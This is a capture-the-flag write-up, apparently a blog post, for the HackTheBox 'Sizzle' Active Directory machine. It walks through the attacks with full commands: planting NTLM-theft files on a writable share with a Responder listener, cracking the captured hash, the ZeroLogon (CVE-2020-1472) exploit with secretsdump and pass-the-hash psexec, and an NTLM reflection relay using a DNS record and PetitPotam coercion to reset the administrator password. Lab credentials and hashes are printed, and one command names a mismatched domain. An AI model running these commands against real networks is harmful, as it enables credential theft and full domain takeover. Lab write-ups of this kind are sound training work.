---
title: "Sizzle HackTheBox" 
date: 2026-5-19 6:00:00 0000+
tags: [WriteUp, Sizzle, HTB, Enumeration, Active Directory, SMB, DNS Poison, Rusthound-CE, Lateral Movement, Bloodhound, Privilege Escalation, targeted kerberoasting, Hash Cracking, NTLM Reflection, Relay, NTLM Relay, Unintended, CVE-2020-1472, ZeroLogon, LDAP Shell, remove-mic ,Windows]
categories: [WriteUps,HackTheBox]
image:
  path: /assets/images/Sizzle_HTB/preview_sizzle.png
---
# Sizzle HackTheBox

`Sizzle` is an `insane` machine from `HackTheBox`, which is exploitable by 2 main unintended vulnerabilities. We start of with a guest share that is world readable and a folder in it was writable to perform a `NTLM theft`, (phishing attack) to obtain a set of credentials for a domain user and then since we have authentication we can perform an `NTLM Reflection attack` to obtain a `SYSTEM LDAP shell` which lets us grants `DACL writes` over to the administrator account, we then change the password for this account and takeover the whole domain.

![image.png](/assets/images/Sizzle_HTB/image.png)

## Initial Foothold

### Rustscan

```bash
rustscan -a 10.129.201.193 -r 1-65535 -- -sC -sV -vv 10.129.201.193
```

![image.png](/assets/images/Sizzle_HTB/image%201.png)

![image.png](/assets/images/Sizzle_HTB/image%202.png)

![image.png](/assets/images/Sizzle_HTB/image%203.png)

![image.png](/assets/images/Sizzle_HTB/image%204.png)

![image.png](/assets/images/Sizzle_HTB/image%205.png)

![image.png](/assets/images/Sizzle_HTB/image%206.png)

![image.png](/assets/images/Sizzle_HTB/image%207.png)

Scan identified that the `windows server 2016` is running active directory on the box.

The domain name is `htb.local` and hostname of the box is `SIZZLE`.

So the FQDN be `sizzle.htb.local`.

### SMB Enumeration

Lets check for the shares with the guest authentication.

```bash
nxc smb 10.129.201.193 -u '.' -p '' --shares
```

![image.png](/assets/images/Sizzle_HTB/image%208.png)

We have read access to one of the shares `Department Shares` lets connect to it using `smbclient`.

```bash
smbclient //10.129.201.193/'Department Shares' -U '.'%''
```

![image.png](/assets/images/Sizzle_HTB/image%209.png)

Lets download everything present in there.

![image.png](/assets/images/Sizzle_HTB/image%2010.png)

Here are some users present.

And after some enumeration i found out that i have write access to the Public folder.

### NTLM Theft

Since we have write access, lets check for the `NTLM Theft.`

I will generate all the malicious files.

```bash
python3 /opt/ntlm_theft/ntlm_theft.py -g all -s 10.10.14.20 -f malicious
```

![image.png](/assets/images/Sizzle_HTB/image%2011.png)

Now Ill start responder as a listener.

```bash
python3 /opt/Responder/Responder.py -I tun0
```

![image.png](/assets/images/Sizzle_HTB/image%2012.png)

Now will connect to the share and transfer all the files to the users/public folder.

```bash
smbclient //10.129.201.193/'Department Shares' -U '.'%''
```

![image.png](/assets/images/Sizzle_HTB/image%2013.png)

After a while we get a hit on our responder tab.

![image.png](/assets/images/Sizzle_HTB/image%2014.png)

Lets crack this hash using hashcat.

```bash
hashcat -m 5600 amandahash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Sizzle_HTB/image%2015.png)

It cracked and the credential found is `Ashare1972` 

### Bloodhound

Lets collect some bloodhound data.

```bash
rusthound -u amanda -p 'Ashare1972' -d htb.local -i 10.129.201.193 --adcs -z
```

![image.png](/assets/images/Sizzle_HTB/image%2016.png)

Marking Amanda as owned in bloodhound and check for the outbounds from Amanda.

![image.png](/assets/images/Sizzle_HTB/image%2017.png)

But since Kerberos port 88 on DC is filtered so we cant do `shadowCredentials` and `targetedkerberoasting` attacks. 

Will add intended ways soon!, for privilege escalation please see below.

## Privilege Escalation

### ZEROLOGON (CVE-2020-1472) (unintended)

Since we know that this is a `windows server 2016` it is vulnerable to `CVE-2020-1472`, which is `zerologon` vulnerability.

```bash
python3 cve-2020-1472-exploit.py 'SIZZLE$' 10.129.201.193
```

![image.png](/assets/images/Sizzle_HTB/image%2018.png)

Exploiting this sets the DC’s password to a null string now we can perform a DCSync attack on the box using `secretsdump`.

```bash
secretsdump.py htb.local/'SIZZLE$'@SIZZLE.HTB.LOCAL -hashes ':31D6CFE0D16AE931B73C59D7E0C089C0'
```

![image.png](/assets/images/Sizzle_HTB/image%2019.png)

Now we can `psexec` as administrator to get a system’s shell on the box.

```bash
psexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 htb.local/Administrator@10.129.201.193
```

![image.png](/assets/images/Sizzle_HTB/image%2020.png)

Rooted!

And we can get user flag in `mrlky` desktop.

![image.png](/assets/images/Sizzle_HTB/image%2021.png)

### NTLM Reflection PetitPotam (unintended)

There is another unintended way to escalate privileges on this box using the `NTLM Reflection attack` since we have authentication.

For this to work the `SMB Signing` is set to `True` and `LDAP signing` is set to `False.`

`SMB Signing - TRUE`

`LDAP Signing - FALSE`

Add a malicious dns entry.

```bash
python3 /opt/krbrelayx/dnstool.py -u 'htb.local\amanda' -p 'Ashare1972' -d 10.10.14.20 -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -dns-ip 10.129.201.193 10.129.201.193 --allow-multiple
```

![image.png](/assets/images/Sizzle_HTB/image%2022.png)

Start the `ntlmrelayx` server.

```bash
ntlmrelayx.py -smb2support -t ldap://10.129.201.193 -i -domain htb.local --remove-mic
```

![image.png](/assets/images/Sizzle_HTB/image%2023.png)

Coercion using `PetitPotam`

```bash
nxc smb 10.129.201.193 -u 'amanda' -p 'Ashare1972' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

![image.png](/assets/images/Sizzle_HTB/image%2024.png)

After the coercion, we get a `hitback` at our relay server and it opened a shell for us on localhost port 11000.

![image.png](/assets/images/Sizzle_HTB/image%2025.png)

Connecting to the shell using nc.

```bash
nc 127.0.0.1 11000
```

![image.png](/assets/images/Sizzle_HTB/image%2026.png)

Now we will use `grant_control` to modify rights over administrator account.

![image.png](/assets/images/Sizzle_HTB/image%2027.png)

Lets use bloodyAD to change the password of administrator.

```bash
bloodyad -d active.htb -u 'amanda' -p 'Ashare1972' -i '10.129.201.193' set password Administrator 'aashwin10!'
```

![image.png](/assets/images/Sizzle_HTB/image%2028.png)

Now lets login using `psexec.py`

```bash
psexec.py htb.local/Administrator:'aashwin10!'@10.129.201.193
```

![image.png](/assets/images/Sizzle_HTB/image%2029.png)

Rooted!

![image.png](/assets/images/Sizzle_HTB/image%2030.png)

Thanks for reading 😄
